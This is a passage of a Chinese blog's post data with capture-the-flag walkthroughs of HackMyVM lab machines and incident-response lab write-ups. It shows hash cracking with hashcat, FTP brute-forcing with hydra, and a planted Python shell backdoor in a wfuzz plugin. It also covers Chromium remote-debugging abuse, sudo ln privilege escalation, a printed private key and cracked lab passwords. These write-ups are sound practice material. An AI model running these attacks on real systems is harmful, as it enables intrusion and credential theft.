5Server version: 10.11.6-MariaDB-0+deb12u1 Debian 12Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.No entry for terminal type &quot;unknown&quot;;using dumb terminal settings.No entry for terminal type &quot;unknown&quot;;using dumb terminal settings.Type &#x27;help;&#x27; or &#x27;\\h&#x27; for help. Type &#x27;\\c&#x27; to clear the current input statement.MariaDB [(none)]&gt; user库的user表里有debian的密码 123456789Database changedMariaDB [user]&gt; select * from user;+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+| id | username | passwd | salt | passwd_hash_algo |+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+| 1 | debian | 2c082e3ff2ca15e3b24f815d70653f0dead09534495069dd140e19adb2d117266cc4b1de8daf55c7c4827a0a5ccf70c6f537ffc4ddc74db4865c41c0 | 8bf3e3452b78544f8bee9400d6936d34 | pbdf2$50500$60 |+----+----------+--------------------------------------------------------------------------------------------------------------------------+----------------------------------+------------------+1 row in set (0.001 sec) pbdf2爆破参考https://notes.benheater.com/books/hash-cracking/page/pbkdf2-hmac-sha256 12345678910111213141516171819202122232425262728293031323334353637┌──(root㉿kali)-[~/Desktop/tmp]└─# cat 2sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA┌──(root㉿kali)-[~/Desktop/tmp]└─# hashcat -a 0 ./2 /usr/share/wordlists/rockyou.txthashcat (v6.2.6) starting in autodetect modeOpenCL API (OpenCL 3.0 PoCL 6.0+debian Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]============================================================================================================================================* Device #1: cpu-haswell-12th Gen Intel(R) Core(TM) i5-12500H, 2917/5898 MB (1024 MB allocatable), 8MCUHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDFNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.Minimum password length supported by kernel: 0Maximum password length supported by kernel: 256INFO: All hashes found as potfile and/or empty entries! Use --show to display them.Started: Wed Mar 26 08:49:58 2025Stopped: Wed Mar 26 08:49:59 2025┌──(root㉿kali)-[~/Desktop/tmp]└─# hashcat ./2 --showHash-mode was not specified with -m. Attempting to auto-detect hash mode.The following mode was auto-detected as the only one matching your input hash:10900 | PBKDF2-HMAC-SHA256 | Generic KDFNOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!Do NOT report auto-detect issues unless you are certain of the hash type.sha256:50500:i/PjRSt4VE+L7pQA1pNtNA==:LAguP/LKFeOyT4FdcGU/DerQlTRJUGndFA4ZrbLRFyZsxLHeja9Vx8SCegpcz3DG9Tf/xN3HTbSGXEHA:1qaz2wsx 用户home目录下还有一个.secret目录，里面有一个密码的压缩包 1234567debian@Newbee:~$ cd .secret/debian@Newbee:~/.secret$ lshint.txt password.zipdebian@Newbee:~/.secret$ cat hint.txtpassword is md5(key)and key is in mysql!!!!!! 密码是1qaz2wsx的md5 图片是马赛克，网上有一个项目是用来恢复马赛克的 https://github.com/spipm/Depixelization_poc 其实也不用跑，图片的原图就是这个项目的示例图片 密码是hellofromtheotherside 123debian@Newbee:/tmp$ su - rootPassword:root@Newbee:~#","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Chromee","slug":"Chromee","date":"2025-03-21T11:11:42.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/03/21/Chromee/","permalink":"https://lvzhouhang.xyz/2025/03/21/Chromee/","excerpt":"","text":"信息搜集arp-scan -l 12345678910┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:ff:66:80, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 0a:00:27:00:00:11 (Unknown: locally administered)192.168.31.2 08:00:27:01:8c:4d PCS Systemtechnik GmbH192.168.31.100 08:00:27:f9:e1:65 PCS Systemtechnik GmbH3 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.402 seconds (106.58 hosts/sec). 3 responded ip为192.168.31.100,然后用nmap扫描端口 123456789101112131415┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.100 -p-Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-21 07:14 EDTNmap scan report for chromee.hmv (192.168.31.100)Host is up (0.0019s latency).Not shown: 65531 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http8080/tcp open http-proxy23333/tcp open elxmgmtMAC Address: 08:00:27:F9:E1:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds 80端口gobuster扫描目录 1234567891011121314151617181920┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.100&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .txt,.php===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.100[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Extensions: txt,php[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/post.php (Status: 200) [Size: 3]/secret.php (Status: 200) [Size: 549] 有一个post.php和secret.php,secret.php不会解析成php会直接下载下来 1234567891011121314151617181920212223#secret.php&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Secret&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;?php $greeting = date(&#x27;H&#x27;) &lt; 12 ? &#x27;早上好&#x27; : (date(&#x27;H&#x27;) &lt; 18 ? &#x27;下午好&#x27; : &#x27;晚上好&#x27;); $visitorIP = htmlspecialchars($_SERVER[&#x27;REMOTE_ADDR&#x27;]); echo &quot;&lt;h1&gt;&#123;$greeting&#125;，adriana&lt;/h1&gt;&quot;; echo &quot;&lt;p&gt;当前时间：&quot; . date(&#x27;Y-m-d H:i:s&#x27;) . &quot;&lt;/p&gt;&quot;; echo &quot;&lt;p&gt;你的IP：&#123;$visitorIP&#125;&lt;/p&gt;&quot;; if (isset($_GET[&#x27;aaa&#x27;])) &#123; $file_content = file_get_contents(&#x27;/opt/note/dic.txt&#x27;); echo $file_content; &#125; else &#123; die(); &#125; ?&gt;&lt;/body&gt;&lt;/html&gt; 8080端口先用gobuster扫描一下目录 1234567891011121314151617181920┌──(root㉿kali)-[~/Desktop/tmp]└─# gobuster dir -u &quot;http://192.168.31.100:8080&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.100:8080[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/javascript (Status: 301) [Size: 328] [--&gt; http://192.168.31.100:8080/javascript/]/silence (Status: 403) [Size: 281]/server-status (Status: 403) [Size: 281] 有一个silence，访问发现Forbidden了 用bp的BypassPro插件发现换一种请求会变成301，感觉有问题，后面添加一个index.html发现绕过了 有一个邮箱，将这个域名添加进hosts里，再去访问http://chromee.hmv/secret.php发现secret.php解析了，GET传入aaa=1 123456下午好，adriana当前时间：2025-03-21 12:28:34你的IP：192.168.31.1The Lost Key Lily, a curious girl, found an old rusty key in the woods. Wondering where it belonged, she asked everyone in the village, but no one knew. One day, she discovered a locked stone well. To her surprise, the key fit. She opened it and descended into a hidden passage. There, she found an ancient chest filled with treasures. But the real treasure was a note inside: “The greatest treasure is the journey, not the prize.” Lily smiled, realizing the adventure was the real reward. 这里有两个人名，adriana和Lily，用cupp各生成一个字典，然后将两个字典合并爆破ftp(23333端口) 1234567891011┌──(root㉿kali)-[~/Desktop/tmp/test]└─# hydra -L ./name -P ./pass 192.168.31.100 ftp -s 23333 -f -t 50Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-21 07:32:30[DATA] max 50 tasks per 1 server, overall 50 tasks, 208 login tries (l:2/p:104), ~5 tries per task[DATA] attacking ftp://192.168.31.100:23333/[23333][ftp] host: 192.168.31.100 login: adriana password: Lily2020[STATUS] attack finished for 192.168.31.100 (valid pair found)1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-21 07:32:31 爆破出了账号密码 1234567891011121314151617┌──(root㉿kali)-[~/Desktop/tmp/test]└─# ftp adriana@192.168.31.100 23333Connected to 192.168.31.100.220 (vsFTPd 3.0.3)331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls -al229 Entering Extended Passive Mode (|||20808|)150 Here comes the directory listing.drwxr-xr-x 2 106 115 4096 Mar 09 08:13 .drwxr-xr-x 4 0 0 4096 Mar 09 08:12 ..-rw-r--r-- 1 0 0 3414 Mar 09 08:13 ...-rw-r--r-- 1 0 0 495 Mar 07 14:40 dic.txt226 Directory send OK. 这有…文件，一开始以为是一个目录，cd不进去，也不看报错就没管了(唉，细节决定成败)导致卡了好长时间，但是卡的时候也没有荒废，在/srv目录下有一个zeus.conf，后面提权要用到 12345┌──(root㉿kali)-[~/Desktop/tmp/test]└─# cat zeus.confpermit follower as softly cmd /usr/local/bin/wfuzzpermit nopass :softly as root cmd /usr/bin/chromiumpermit nopass :softly as root cmd /usr/bin/kill 12345678ftp&gt; cd /home250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||5941|)150 Here comes the directory listing.drwxr-x--- 5 1000 1000 4096 Mar 21 08:18 followerdrwxr-x--- 5 1001 1001 4096 Mar 21 05:37 softly226 Directory send OK. 还可以知道用户名 …文件是一个私钥，john可以爆破出来密码 123┌──(root㉿kali)-[~/Desktop/tmp/test]└─# john 1 --showid:cassandra 1234┌──(root㉿kali)-[~/Desktop/tmp/test]└─# ssh follower@192.168.31.100 -i idEnter passphrase for key &#x27;id&#x27;:follower@Chromee:~$ 提权follower下有一个cat.git和note.txt 12345follower@Chromee:~$ cat note.txtThink about rotations and the cat’s secrets.47 is not just a number, it&#x27;s a twist of fate. 这个47提示的很明显是rot47 cat.gif用convert可以分离出来12张图片，但是没有用 1convert cat.gif 1.jpg 不是空间轴可以试试时间轴 123┌──(root㉿kali)-[~/Desktop/tmp/test]└─# identify -format &quot;%T &quot; cat.gif65 98 65 100 102 98 67 6 6 6 6 6 6 将后面的6个6去掉扔进cyberchef中解密然后rot47解密 得到了p3p573r，因为前面拿到的zeus.conf能够知道follower需要密码才能以softly执行wfuzz 先用find找到wfuzz的路径 1234follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find / -name &quot;wfuzz&quot; 2&gt;/dev/null/home/follower/.config/wfuzz/usr/local/bin/wfuzz/usr/local/lib/python3.9/dist-packages/wfuzz #这个就是wfuzz的路径 12follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ find ./ -writable 2&gt;/dev/null./plugins/payloads/file.py 在他的wfuzz的目录下找可以写的文件能找到file.py,cat一下 123follower@Chromee:/usr/local/lib/python3.9/dist-packages/wfuzz$ cat ./plugins/payloads/file.pyimport ptypty.spawn(&quot;/bin/bash&quot;) 不用想了，肯定是作者降低难度了后门都留好了 1234follower@Chromee:~$ /usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;Password: /usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.softly@Chromee:/home/follower$ 上传pspy64，能发现每隔一段时间root用户都会执行secript.sh 122025/03/21 12:53:01 CMD: UID=0 PID=1504 | /bin/sh -c /root/script.sh2025/03/21 12:53:01 CMD: UID=0 PID=1505 | /bin/bash /root/script.sh 结合题目名Chromee和前面得到的zeus.conf，能猜到肯定和浏览器有关系，运行linpeas.sh能看到/media下有一个debug.kdbx 123┌──(root㉿kali)-[~/Desktop/tmp/test]└─# file debug.kdbxdebug.kdbx: PDF document, version 1.7 是一个pdf文件 去网上查这个东西，谷歌浏览器自带这个工具chrome://inspect/，还有这个9222的默认端口（后面要用到） 先写一个authorized_keys 在网上查到开启远程debug的命令 1doas /usr/bin/chromium --headless --remote-debugging-port=9222 --no-sandbox http://127.0.0.1 因为靶机没有桌面，所以一定要带上–headless，不然会报错，启动好后再用socat端口转发 1softly@Chromee:~$ ./socatx64.bin TCP-LISTEN:9999,fork TCP4:127.0.0.1:9222 用谷歌浏览器连接，打开第一个连接 等一会就会发现向127.0.0.1/post.php发送一个key，不用base64解码，这个就是root的密码。 chromium的远程端口必须要是9222默认端口否则他监听不到就很难受","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"应急响应靶机训练-Web3","slug":"应急响应靶机训练-Web3","date":"2025-02-18T12:02:58.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/18/应急响应靶机训练-Web3/","permalink":"https://lvzhouhang.xyz/2025/02/18/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web3/","excerpt":"","text":"隐藏用户名称 这还没开始第一道题就已经结束了 攻击者的两个IP地址 远程登录找到一个ip 在hacker的目录下能找到一个system.bat的文件，可以看到向web里面写了一个webshell，可以去查看apache的日志 还有第一个flag 第二个IP 黑客遗留下的flag【3个】 计划任务里有一个flag 可以看到web是一个Z-blog，去官网下载一个修改后台密码的工具 https://bbs.zblogcn.com/thread-83419.html 可以看到还有一个hacker用户 第三个flag","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"应急响应靶机训练-Web2","slug":"应急响应靶机训练-Web2","date":"2025-02-08T07:41:44.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/08/应急响应靶机训练-Web2/","permalink":"https://lvzhouhang.xyz/2025/02/08/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web2/","excerpt":"","text":"1.攻击者的IP地址（两个）？ 第一个ip在apache的日志里，另一个是登录日志可以直接用工具windows1check或者事件查看器里查找 2.攻击者的webshell文件名？ 查看apache的日志发现system.php是webshell的文件名 3.攻击者的webshell密码？密码是hcak6618 4.攻击者的伪QQ号？ 众所周知，qq登陆过后会默认会在文档里创建一个Tencent File里面会记录每个登陆过的qq号，在FileRecv里是通过qq下载的文件 5.攻击者的伪服务器IP地址？ 黑客通过qq下载了一个frp，在frpc的配置文件里有伪服务器IP和端口 6.攻击者的服务器端口？65536 7.攻击者是如何入侵的（选择题）？ 通过分析ftp的日志文件可以发现，攻击者通过爆破ftp admin的密码登录成功，然后上传system.php文件 看phpstudy的ftp配置可以发现ftp的根目录在www目录，所以上传的system.php可以访问到 8.攻击者的隐藏用户名？ 学到新招，win+r-&gt;cmd-&gt;lusrmgr.msc可以查看本地用户和组，或者C盘USER能找到hack887$","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"应急响应靶机训练-Web1","slug":"应急响应靶机训练-Web1","date":"2025-02-07T04:10:42.000Z","updated":"2025-04-19T13:25:36.771Z","comments":true,"path":"2025/02/07/应急响应靶机训练-Web1/","permalink":"https://lvzhouhang.xyz/2025/02/07/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E6%9C%BA%E8%AE%AD%E7%BB%83-Web1/","excerpt":"","text":"123456前景需要：小李在值守的过程中，发现有CPU占用飙升，出于胆子小，就立刻将服务器关机，并找来正在吃苕皮的hxd帮他分析，这是他的服务器系统，请你找出以下内容，并作为通关条件：1.攻击者的shell密码2.攻击者的IP地址3.攻击者的隐藏账户名称4.攻击者挖矿程序的矿池域名(仅域名)5.有实力的可以尝试着修复漏洞 1.攻击者的shell密码打开phpstudy找到网站的根目录，然后用D盾扫 能找到是一个冰蝎马，密码是rebeyond 2.攻击者的IP地址查看phpstudy的日志文件，有apache和nginx，nginx的日志全是0kb，打开apache的access.log文件搜索shell.php能找到攻击者的ip 3.攻击者的隐藏账户名称可以直接查看C盘的用户有一个hack168$ 或者可以查看登录的日志，如果不用工具的话就在事件查看器里-安全找事件ID为4624的事件 4.攻击者挖矿程序的矿池域名(仅域名)在C:\\Users\\hack168$\\Desktop里有一个Kuang，这是一个python编译的exe文件，先转一下pyc然后反编译就行了 5.有实力的可以尝试着修复漏洞phpstudy将web服务启动，是一个EMGLOG服务，后台的账号密码是admin/123456 https://blog.csdn.net/W13680336969/article/details/137267677 打上最新的补丁，并把admin的密码改掉 6.非预期桌面上有一个解体的校验程序，和kuang一样，exe-&gt;pyc然后反编译","categories":[{"name":"应急响应","slug":"应急响应","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Helium","slug":"HackmyVM-Helium","date":"2025-01-26T06:26:29.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/26/HackmyVM-Helium/","permalink":"https://lvzhouhang.xyz/2025/01/26/HackmyVM-Helium/","excerpt":"","text":"信息搜集123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.178 08:00:27:d1:eb:7a PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.217 b4:0f:b3:8e:31:07 vivo Mobile Communication Co., Ltd.192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 2.000 seconds (128.00 hosts/sec). 5 responded ip是192.168.31.178，nmap扫描一下端口 123456789101112┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.178 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 01:27 ESTNmap scan report for helium (192.168.31.178)Host is up (0.0046s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:D1:EB:7A (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds 80端口123456789101112131415161718192021222324┌──(root㉿kali)-[~/Desktop/tmp]└─# curl 192.168.31.178&lt;title&gt;RELAX&lt;/title&gt;&lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;&lt;head&gt;&lt;style&gt;body &#123; background-image: url(&#x27;screen-1.jpg&#x27;); background-repeat: no-repeat; background-attachment: fixed; background-size: 100% 100%;&#125;&lt;/style&gt; &lt;link href=&quot;bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;audio src=&quot;relax.wav&quot; preload=&quot;auto loop&quot; controls&gt;&lt;/audio&gt;&lt;/body&gt; 有注释paul可能是ssh的账号，relax.wav下载下了之后没有东西，/bootstrap.min.css给了一个wav文件，用Audacity分析频谱能发现dancingpassyo，ssh登录试试，登录成功 提权1234567paul@MiWiFi-RA71-srv:~$ sudo -lsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostnameMatching Defaults entries for paul on MiWiFi-RA71-srv: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser paul may run the following commands on MiWiFi-RA71-srv: (ALL : ALL) NOPASSWD: /usr/bin/ln 1234paul@MiWiFi-RA71-srv:~$ sudo ln -fs /bin/sh /bin/usr/lnsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname# iduid=0(root) gid=0(root) groups=0(root) 提权成功","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Twisted","slug":"HackmyVM-Twisted","date":"2025-01-24T07:12:50.000Z","updated":"2025-04-19T13:25:36.799Z","comments":true,"path":"2025/01/24/HackmyVM-Twisted/","permalink":"https://lvzhouhang.xyz/2025/01/24/HackmyVM-Twisted/","excerpt":"","text":"信息搜集1234567891011┌──(root㉿kali)-[~/Desktop/tmp]└─# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.22 08:00:27:63:fe:59 PCS Systemtechnik GmbH192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded ip为192.168.31.22. nmap扫描端口 1234567891011121314┌──(root㉿kali)-[~/Desktop/tmp]└─# nmap 192.168.31.22 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-24 02:14 ESTStats: 0:00:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 95.30% done; ETC: 02:15 (0:00:01 remaining)Nmap scan report for twisted (192.168.31.22)Host is up (0.0065s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE80/tcp open http2222/tcp open EtherNetIP-1MAC Address: 08:00:27:63:FE:59 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds 2222端口为ssh端口 80端口123456789┌──(root㉿kali)-[~/Desktop/tmp]└─# curl 192.168.31.22&lt;h1&gt;I love cats!&lt;/h1&gt;&lt;img src=&quot;cat-original.jpg&quot; alt=&quot;Cat original&quot; width=&quot;400&quot; height=&quot;400&quot;&gt;&lt;br&gt;&lt;h1&gt;But I prefer this one because seems different&lt;/h1&gt;&lt;img src=&quot;cat-hidden.jpg&quot; alt=&quot;Cat Hidden&quot; width=&quot;400&quot; height=&quot;400&quot;&gt; 80端口存在两张jpg图片 下载下了用stegseek查看 12345678910111213141516┌──(root㉿kali)-[~/Desktop/tmp]└─# stegseek cat-original.jpgStegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: &quot;westlife&quot;[i] Original filename: &quot;markus.txt&quot;.[i] Extracting to &quot;cat-original.jpg.out&quot;.┌──(root㉿kali)-[~/Desktop/tmp]└─# stegseek cat-hidden.jpgStegSeek 0.6 - https://github.com/RickdeJager/StegSeek[i] Found passphrase: &quot;sexymama&quot;[i] Original filename: &quot;mateo.txt&quot;.[i] Extracting to &quot;cat-hidden.jpg.out&quot;. 给了两个ssh的账号密码 提权先登录markus 1234markus@MiWiFi-RA71-srv:~$ cat note.txtHi bonita,I have saved your id_rsa here: /var/cache/apt/id_rsaNobody can find it. 给了一个提示，是bonita用户的id_rsa suid提权看看 12345678910111213markus@MiWiFi-RA71-srv:~$ find / -perm -u=s 2&gt;/dev/null/home/bonita/beroot/usr/bin/su/usr/bin/umount/usr/bin/gpasswd/usr/bin/passwd/usr/bin/mount/usr/bin/chfn/usr/bin/chsh/usr/bin/newgrp/usr/lib/openssh/ssh-keysign/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/eject/dmcrypt-get-device /home/bonita/beroot这个很可疑但是没有权限，登录mateo看看 12mateo@MiWiFi-RA71-srv:~$ cat note.txt/var/www/html/gogogo.wav 下载下了，用Audacity查看，能发现这是莫斯，解码得到 1GO DEEPER... COME WITH ME... LITTLE RABBIT... 没啥用 123mateo@MiWiFi-RA71-srv:~$ /usr/sbin/getcap -r / 2&gt;/dev/null/usr/bin/ping = cap_net_raw+ep/usr/bin/tail = cap_dac_read_search+ep getcap可以查看文件的特殊权限，tail可以读取 12345678910111213141516171819202122232425262728mateo@MiWiFi-RA71-srv:~$ tail /var/cache/apt/id_rsa -n 100-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa+xshyrmk6zdFyguFUO7tN2TCJGTomDTXrG/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBSolvmldJg2habNOUGA4EBKlTwfDi+vjDP8d77mF+rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1vD5282SncYtJb/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcFgFnch7ptoxAqe0M0UIEzP+G2ull3m80G5L7Q/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5Ctt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGMgl9+zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVCxCQFX9U2tULUiiP8XHeFRpIILg8FKiW+aV0mDaFps05QYDgQEqVPB8OL6+MM/x3vuYX6u8DcTBHe+PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9HuN7M51f7+eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM/4ba6WXebzQbkvtD/dpyDXhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvuU3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa+VprspxevCM0ibNojtD4rJ1FKPn6cls5gImZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4/hmJTiFsew+7IAKE+oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K/v/x2pW78HIktaQPutronxD8/fwGxQnseC69E6vdh/5tS8+lDEfYDz4oEy9AP26Hdtho0D6E9VT9T//2vynHLbmSXKmPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD+g8BhMCovIBrPZlHCu+bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG+9/PI6bN+iwloDlugtqyzvf924Kkhdk+N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4+fgo9LCyphiXrm7UbJHDVSPUvPg4Fg/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjhV2URHPPhqFEa+iB138cSgCU3RxbRK7Qm1S7/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJLlecEv2Hx03xyRZBsHFkMf+dMDC0ueU692Gl7YxRw+Lic0PQAAAIEA82v3Ytb97SghV7rza0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2/OqQgKFeERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTituD0POe+rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ==-----END OPENSSH PRIVATE KEY----- ssh登陆，将beroot下载ida分析 123456789101112131415161718int __fastcall main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+1Ch] [rbp-4h] BYREF printf(&quot;Enter the code:\\n &quot;); scanf(&quot;%i&quot;, &amp;v4); if ( v4 == 5880 ) &#123; 